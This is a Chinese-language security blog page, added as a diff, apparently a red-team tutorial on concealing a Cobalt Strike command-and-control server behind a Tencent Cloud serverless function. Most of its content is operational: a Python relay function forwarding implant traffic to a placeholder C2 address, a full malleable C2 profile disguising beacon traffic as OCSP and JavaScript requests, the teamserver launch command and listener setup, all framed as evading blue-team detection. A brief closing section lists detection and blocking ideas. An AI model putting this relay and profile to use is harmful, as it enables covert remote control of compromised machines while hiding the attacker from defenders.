@@ -1,0 +1,195 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>云函数隐藏C2 | ALe's Blog</title><meta name="author" content="ALe"><meta name="copyright" content="ALe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="核心思想核心思想其实很简单，就是用第三方提供的服务接收 C2 客户端的流量，转发给 C2 服务端，避免直接暴露服务端，也可以用加白的域名混淆视听避免蓝队人员发现攻击和反连行为 12345   运行木马                                           收到上线包┌─────▼─────┐             ┌─────▼─────┐           ┌─">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云函数隐藏C2">
+<meta property="og:url" content="https://ale1293528.github.io/2025/07/29/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FC2/index.html">
+<meta property="og:site_name" content="ALe&#39;s Blog">
+<meta property="og:description" content="核心思想核心思想其实很简单，就是用第三方提供的服务接收 C2 客户端的流量，转发给 C2 服务端，避免直接暴露服务端，也可以用加白的域名混淆视听避免蓝队人员发现攻击和反连行为 12345   运行木马                                           收到上线包┌─────▼─────┐             ┌─────▼─────┐           ┌─">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ale1293528.github.io/img/anon1.png">
+<meta property="article:published_time" content="2025-07-29T06:36:50.000Z">
+<meta property="article:modified_time" content="2025-08-07T11:22:25.713Z">
+<meta property="article:author" content="ALe">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="云安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ale1293528.github.io/img/anon1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "云函数隐藏C2",
+  "url": "https://ale1293528.github.io/2025/07/29/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FC2/",
+  "image": "https://ale1293528.github.io/img/anon1.png",
+  "datePublished": "2025-07-29T06:36:50.000Z",
+  "dateModified": "2025-08-07T11:22:25.713Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ALe",
+      "url": "https://ale1293528.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ale1293528.github.io/2025/07/29/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FC2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '云函数隐藏C2',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/anon1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ALe's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">云函数隐藏C2</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">云函数隐藏C2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-29T06:36:50.000Z" title="Created 2025-07-29 14:36:50">2025-07-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-07T11:22:25.713Z" title="Updated 2025-08-07 19:22:25">2025-08-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>核心思想其实很简单，就是用第三方提供的服务接收 C2 客户端的流量，转发给 C2 服务端，避免直接暴露服务端，也可以用加白的域名混淆视听避免蓝队人员发现攻击和反连行为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   运行木马                                           收到上线包</span><br><span class="line">┌─────▼─────┐             ┌─────▼─────┐           ┌──────▼───────┐</span><br><span class="line">│  受害主机  │--发送上线包-&gt;│ 国内某公有 |---上线包-&gt;│ Cobalt Strike│</span><br><span class="line">│           │&lt;-执行命令----│ 函数转发   │&lt;-执行命令-│    服务器     |</span><br><span class="line">└───────────┘             └───────────┘           └──────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>第三方服务最好具备以下特点：</p>
+<ul>
+<li>国内外访问速度都很快</li>
+<li>国外厂商</li>
+<li>价格便宜（有钱可以忽略）</li>
+<li>主动提供免费加速域名（同上）</li>
+</ul>
+<h2 id="云函数配置"><a href="#云函数配置" class="headerlink" title="云函数配置"></a>云函数配置</h2><p>首先进入腾讯云创建一个自定义函数，运行环境选 python，将下面的代码复制进函数代码中（记得改 C2 地址为我们自己的 C2 地址）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    path = <span class="literal">None</span></span><br><span class="line">    headers = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        C2=<span class="string">&#x27;http://c2ip&#x27;</span></span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;path&#x27;</span><span class="keyword">in</span> event.keys():</span><br><span class="line">            path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;headers&#x27;</span><span class="keyword">in</span> event.keys():    </span><br><span class="line">            headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;httpMethod&#x27;</span><span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.headers)</span><br><span class="line">            <span class="built_in">print</span>(resp.content)</span><br><span class="line">        response=&#123;</span><br><span class="line">            <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后进入触发器中创建一个触发器。选择触发器版本为$LATEST，触发方式为API网关触发，开启集成响应。</p>
+<p><img src="/img/202507291.png"></p>
+<p>然后点击 API 服务名进入 API 网关页面进行配置，这里仅修改路径为&#x2F;就可以，其他配置不用动</p>
+<p>然后点击立即完成，发布任务即可</p>
+<p><img src="/img/202507292.png"></p>
+<p>此时我们便可以使用生成的公网域名中的 http 域名进行上线了</p>
+<h2 id="C2-配置"><a href="#C2-配置" class="headerlink" title="C2 配置"></a>C2 配置</h2><p>接下来我们要编译一个 CS 的 profile 文件，我们要通过这个文件对我们的包内容进行配置来进行收发包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">set sample_name &quot;func&quot;;</span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">set uri &quot;/api/x&quot;;</span><br><span class="line"></span><br><span class="line">client &#123;</span><br><span class="line">header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">metadata &#123;</span><br><span class="line">base64;</span><br><span class="line">prepend &quot;SESSIONID=&quot;;</span><br><span class="line">header &quot;Cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">output &#123;</span><br><span class="line">base64;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class="line">set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">set uri &quot;/api/y&quot;;</span><br><span class="line">client &#123;</span><br><span class="line">header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">id &#123;</span><br><span class="line">base64;</span><br><span class="line">prepend &quot;JSESSION=&quot;;</span><br><span class="line">header &quot;Cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">    base64;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">output &#123;</span><br><span class="line">base64;</span><br><span class="line">print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>CS 还有一个自带的 c2lint 工具可以帮助我们检验 profile 文件的内容是否正确</p>
+<p>接下来用命令启动 CS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver ip passwd xxx.profile</span><br></pre></td></tr></table></figure>
+
+<p>设置监听器，这里要注意端口为80，host为我们刚刚在API网关中的地址，注意需要删除前面的http及后面的:80<br><img src="/img/202507293.png"></p>
+<p>至于防护思路倒是也蛮简单的：</p>
+<ul>
+<li>监测疑似 CS 马的攻击流量，例如请求 &#x2F;pixel，&#x2F;__utm.gif，&#x2F;ga.js 等类似 URL 的流量进行重点监测，或者使用微步在线情报识别 CS 马的外联地址</li>
+<li>确认自己资产中是否有某云的云函数的正常业务，没有的话直接把<code>*.apigw.#######cs.com</code>这样的子域名封了就好</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io">ALe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io/2025/07/29/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FC2/">https://ale1293528.github.io/2025/07/29/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FC2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a></div><div class="post-share"><div class="social-share" data-image="/img/anon1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/08/05/%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E7%BB%95%E8%BF%87ip%E5%B0%81%E9%94%81/" title="云函数实现代理绕过ip封锁"><img class="cover" src="/img/mygo1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">云函数实现代理绕过ip封锁</div></div><div class="info-2"><div class="info-item-1">云函数可以用来搭建一个轻量代理池或 IP 中转机制，原理上跟传统代理池类似，虽然匿名性不如高匿商业代理，但在做扫描器等任务时依然方便实用，前提是控制好访问频率和风险 配置函数代码123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding: utf8 -*-import jsonimport picklefrom base64 import b64decode, b64encodeimport requestsSCF_TOKEN = &quot;TOKEN&quot; #需要自定义随机值，用于鉴权def authorization():    return &#123;        &quot;isBase64Encoded&quot;: False,        &quot;statusCode&quot;: 401,        &quot;headers&quot;: &#123;&#125;,        &quot;body&quot;: &quot...</div></div></div></a><a class="pagination-related" href="/2025/07/28/C2%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/" title="C2框架解析"><img class="cover" src="/img/mygo4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">C2框架解析</div></div><div class="info-2"><div class="info-item-1">C2 框架的发展历史摘自https://daffodi11.github.io/post/hong-dui-wu-qi-yan-fa-chang-shi-shi-xian-yi-ge-xian-dai-c2-kuang-jia-daffodilc2/ 123最早且广为人知的C2(command&amp;control)框架可能是第一代的灰鸽子,采用客户端“主动连接”的方式,即客户端在主机A执行后，客户端监听，在服务端输入主机A的IP与端口后，才能进行通讯。  后来因为内网环境与防火墙的因素，发展出了“被动连接”方式的第二代C2框架，例如GHOST、大灰狼，与“主动连接”相反，即服务端监听，客户端主动连接服务端。此时出现了两种配置方式，一是FTP上线、二是域名解析上线。有效适应大多数网络环境,但易溯源、网络数据包易被提取特征、不易于现代红队协同使用。  为了解决这些问题，发展出了第三代C2框架例如cobalt strike,它支持HTTP、HTTPS、DNS等协议通讯,由TeamServer转发请求,隐秘性好、易于扩展、适合现代红队协同工作,如今被广泛使用。  什么是 C2C2（C...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/28/C2%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/" title="C2框架解析"><img class="cover" src="/img/mygo4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-28</div><div class="info-item-2">C2框架解析</div></div><div class="info-2"><div class="info-item-1">C2 框架的发展历史摘自https://daffodi11.github.io/post/hong-dui-wu-qi-yan-fa-chang-shi-shi-xian-yi-ge-xian-dai-c2-kuang-jia-daffodilc2/ 123最早且广为人知的C2(command&amp;control)框架可能是第一代的灰鸽子,采用客户端“主动连接”的方式,即客户端在主机A执行后，客户端监听，在服务端输入主机A的IP与端口后，才能进行通讯。  后来因为内网环境与防火墙的因素，发展出了“被动连接”方式的第二代C2框架，例如GHOST、大灰狼，与“主动连接”相反，即服务端监听，客户端主动连接服务端。此时出现了两种配置方式，一是FTP上线、二是域名解析上线。有效适应大多数网络环境,但易溯源、网络数据包易被提取特征、不易于现代红队协同使用。  为了解决这些问题，发展出了第三代C2框架例如cobalt strike,它支持HTTP、HTTPS、DNS等协议通讯,由TeamServer转发请求,隐秘性好、易于扩展、适合现代红队协同工作,如今被广泛使用。  什么是 C2C2（C...</div></div></div></a><a class="pagination-related" href="/2025/08/05/%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%90%86%E7%BB%95%E8%BF%87ip%E5%B0%81%E9%94%81/" title="云函数实现代理绕过ip封锁"><img class="cover" src="/img/mygo1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-05</div><div class="info-item-2">云函数实现代理绕过ip封锁</div></div><div class="info-2"><div class="info-item-1">云函数可以用来搭建一个轻量代理池或 IP 中转机制，原理上跟传统代理池类似，虽然匿名性不如高匿商业代理，但在做扫描器等任务时依然方便实用，前提是控制好访问频率和风险 配置函数代码123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding: utf8 -*-import jsonimport picklefrom base64 import b64decode, b64encodeimport requestsSCF_TOKEN = &quot;TOKEN&quot; #需要自定义随机值，用于鉴权def authorization():    return &#123;        &quot;isBase64Encoded&quot;: False,        &quot;statusCode&quot;: 401,        &quot;headers&quot;: &#123;&#125;,        &quot;body&quot;: &quot...</div></div></div></a><a class="pagination-related" href="/2025/07/19/%E4%BA%91%E5%87%BD%E6%95%B0%E6%94%BB%E9%98%B2/" title="云函数攻防"><img class="cover" src="/img/mygo6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-19</div><div class="info-item-2">云函数攻防</div></div><div class="info-2"><div class="info-item-1">在学习云函数之前，我们要先了解一下Serverless Serverless概述简单来说，Serverless就是无需管理服务器的架构模式，我们只需要写业务代码，云平台会自动处理部署、弹性扩容、资源调度、运维运作等一切幕后工作 在狭义上来讲Serverless可以分成以下两个方面 123456789┌───────────────────────────────────────────────────────────┐│                        Serverless                         │└────────────┬────────────────────────────────┬─────────────┘             │                                │ ┌───────────▼────────────┐      ┌────────────▼───────────┐ │  FaaS：函数即服务       │      │  BaaS：后端即服务       │ │  Funct...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ALe</div><div class="author-info-description">从渗透测试到网安烧烤的一生</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ALe1293528"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">恐惧扼住咽喉，如枷锁禁锢我的双臂 我向沉默发问，沉默却愈发震耳欲聋</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span class="toc-number">1.</span> <span class="toc-text">核心思想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">云函数配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C2-%E9%85%8D%E7%BD%AE"><span class="toc-number">3.</span> <span class="toc-text">C2 配置</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"><img src="/img/mygo6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"/></a><div class="content"><a class="title" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行">文件解压之过（Zip Slip）漏洞导致 Python 代码执行</a><time datetime="2025-11-30T03:58:13.000Z" title="Created 2025-11-30 11:58:13">2025-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改"><img src="/img/mygo7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BehinderV4魔改"/></a><div class="content"><a class="title" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" 